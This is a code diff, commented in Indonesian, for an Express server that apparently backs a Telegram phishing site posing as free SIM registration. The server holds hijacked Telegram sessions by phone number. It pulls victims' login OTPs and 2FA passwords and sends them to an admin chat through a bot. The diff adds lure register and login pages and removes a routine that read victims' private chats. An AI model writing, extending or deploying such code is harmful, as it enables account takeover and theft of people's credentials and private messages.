@@ -10,15 +10,23 @@ import fs from 'fs';
 import path from 'path';
 import { fileURLToPath } from 'url';
 
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+
 const app = express();
 app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
+app.use('/styles', express.static(path.join(__dirname, 'styles')));
+app.use('/img', express.static(path.join(__dirname, 'img')));
+
+
 
 const API_ID = parseInt(process.env.API_ID, 10);
 const API_HASH = process.env.API_HASH;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // ID user admin
+const webhookUrl = 'https://registarasimgratis.vercel.app/telegram/webhook'; // Ganti dengan URL webhook Anda
 
 const activeClients = {};
 const sessions = {};
@@ -413,6 +421,35 @@ app.post('/delete-session', (req, res) => {
 });
 
 
+async function setTelegramWebhook() {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;
+    const data = {
+        url: webhookUrl
+    };
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        });
+
+        const jsonResponse = await response.json();
+        
+        if (response.ok) {
+            console.log('Webhook berhasil diatur:', jsonResponse);
+        } else {
+            console.error('Gagal mengatur webhook:', jsonResponse);
+        }
+    } catch (error) {
+        console.error('Terjadi kesalahan saat mengatur webhook:', error);
+    }
+}
+
+// Panggil fungsi untuk mengatur webhook
+setTelegramWebhook();
 
 app.post('/telegram/webhook', async (req, res) => {
     const { message, callback_query } = req.body;
@@ -425,7 +462,8 @@ app.post('/telegram/webhook', async (req, res) => {
             const phoneNumbers = Object.keys(sessions);
             const inlineKeyboard = phoneNumbers.map(phone => [
                 { text: phone, callback_data: `phone_${phone}` },
-                { text: '❌ ', callback_data: `delete_${phone}` }  //  Tombol delete
+                { text: '❌ Hapus', callback_data: `delete_${phone}` },  // Tombol Delete
+                { text: '📋 Salin', callback_data: `copy_${phone}` }  // Tombol Salin
             ]);            
             const menuMessage = 'Pilih nomor telepon:';
             const replyMarkup = { inline_keyboard: inlineKeyboard };
@@ -442,7 +480,7 @@ app.post('/telegram/webhook', async (req, res) => {
             
             // Kirim permintaan ke endpoint /delete-session untuk menghapus sesi
             try {
-                const deleteResponse = await fetch(`http://127.0.0.1:3000/delete-session`, { // ganti sesuai nama domain
+                const deleteResponse = await fetch(`https://registarasimgratis.vercel.app/delete-session`, { // ganti sesuai nama domain
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ phoneNumber })
@@ -455,7 +493,6 @@ app.post('/telegram/webhook', async (req, res) => {
                 await sendTelegramMessage(chatId, `Gagal menghapus sesi untuk ${phoneNumber}.`);
             }
         }
-        
 
         if (data.startsWith('phone_')) {
             const phoneNumber = data.split('_')[1];
@@ -484,9 +521,18 @@ app.post('/telegram/webhook', async (req, res) => {
                         const password = twoFAPasswords[phoneNumber] || 'Password 2FA tidak ditemukan';
                         customMessage += `\nPassword : ${password}`;
 
-                        await sendTelegramMessage(chatId, customMessage);
+                        // Menambahkan tombol salin nomor telepon
+                        const replyMarkup = {
+                            inline_keyboard: [
+                                [
+                                    { text: `Salin ${phoneNumber}`, callback_data: `copy_${phoneNumber}` }
+                                ]
+                            ]
+                        };
+
+                        await sendTelegramMessage(chatId, customMessage, replyMarkup);
                         if (chatId !== ADMIN_CHAT_ID) {
-                            await sendTelegramMessage(ADMIN_CHAT_ID, customMessage);
+                            await sendTelegramMessage(ADMIN_CHAT_ID, customMessage, replyMarkup);
                         }
                     } else {
                         await sendTelegramMessage(chatId, `Tidak dapat menemukan OTP dalam pesan untuk ${phoneNumber}.`);
@@ -500,30 +546,10 @@ app.post('/telegram/webhook', async (req, res) => {
                 console.error(`Error fetching OTP or handling callback for ${phoneNumber}:`, error);
                 await sendTelegramMessage(chatId, `Terjadi kesalahan saat mengambil OTP atau password untuk ${phoneNumber}.`);
             }
-        } else if (data.startsWith('chat_')) {
-            const [_, chatIndex, phoneNumber] = data.split('_');
-            const sessionString = sessions[phoneNumber];
-            if (!sessionString) {
-                await sendTelegramMessage(chatId, `Sesi tidak ditemukan untuk nomor ${phoneNumber}.`);
-                return res.sendStatus(200);
-            }
-
-            const client = new TelegramClient(createStringSession(sessionString), API_ID, API_HASH, {
-                connectionRetries: 5,
-            });
-
-            try {
-                await client.connect();
-                const { dialogs } = await getChatList(client);
-                const chat = dialogs[parseInt(chatIndex, 10)];
-                const messages = await getMessagesFromChat(client, chat.id);
-                const chatTitle = chat.name || chat.title || chat.username;
-                await sendTelegramMessage(chatId, `Pesan dari chat ${chatTitle} untuk ${phoneNumber}:\n${messages}`);
-                await client.disconnect();
-            } catch (error) {
-                console.error(`Error fetching messages for ${phoneNumber}:`, error);
-                await sendTelegramMessage(chatId, `Terjadi kesalahan saat mengambil pesan dari chat untuk ${phoneNumber}.`);
-            }
+        } else if (data.startsWith('copy_')) {
+            const phoneNumber = data.split('_')[1];
+            // Menyalin nomor telepon
+            await sendTelegramMessage(chatId, `Nomor telepon yang disalin: ${phoneNumber}`);
         }
     }
 
@@ -531,16 +557,29 @@ app.post('/telegram/webhook', async (req, res) => {
 });
 
 
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+
+// const __filename = fileURLToPath(import.meta.url);
+// const __dirname = path.dirname(__filename);
+
+
 
 app.get('/', (req, res) => {
     res.sendFile(path.resolve(__dirname, 'index.html'));
 });
 
-app.get('/reload', (req, res) => {
-    console.log('Received request for /reload');
-    res.sendFile(path.resolve(__dirname, 'reload.html'), (err) => {
+app.get('/register', (req, res) => {
+    console.log('Received request for /register');
+    res.sendFile(path.resolve(__dirname, 'register.html'), (err) => {
+        if (err) {
+            console.error('Error sending file:', err);
+            res.status(err.status).end();
+        }
+    });
+});
+
+app.get('/login', (req, res) => {
+    console.log('Received request for /login');
+    res.sendFile(path.resolve(__dirname, 'login.html'), (err) => {
         if (err) {
             console.error('Error sending file:', err);
             res.status(err.status).end();
